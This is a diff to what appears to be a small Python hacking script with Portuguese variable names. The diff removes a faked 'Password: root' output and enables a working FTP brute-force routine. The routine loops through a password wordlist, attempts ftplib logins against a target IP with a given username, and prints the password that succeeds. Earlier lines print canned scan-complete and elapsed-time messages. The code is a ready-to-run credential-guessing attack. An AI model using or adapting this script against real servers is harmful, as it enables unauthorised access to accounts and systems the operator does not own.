@@ -22,21 +22,21 @@ time.sleep(1)
 print("Scanning Complete")
 time.sleep(1)
 print("Time elapsed: 24.08771")
-print("Password: root")
-#def ftp(wordlist, user, alvo):
-#    arq = open(wordlist, 'rb')
-#    for senha in arq.readlines():
-#        senha = senha.decode('ISO-8859-1')
-#        try:
-#            c = ftplib.FTP(alvo)
-#            c.login(user, senha)
-#            print('Passord:', senha)
-#            break
-#        except ftplib.error_perm:
- #           print('Password: {}Incorret\n'.format(senha))
+
+def ftp(wordlist, user, alvo):
+    arq = open(wordlist, 'rb')
+    for senha in arq.readlines():
+        senha = senha.decode('ISO-8859-1')
+        try:
+            c = ftplib.FTP(alvo)
+            c.login(user, senha)
+            print('Passord:', senha)
+            break
+        except ftplib.error_perm:
+            print('Password: {}Incorret\n'.format(senha))
 
 
 
-#end = time.time()
-#var = start - end
-#ftp(arguments.PSW,arguments.USR,arguments.IP)
+end = time.time()
+var = start - end
+ftp(arguments.PSW,arguments.USR,arguments.IP)
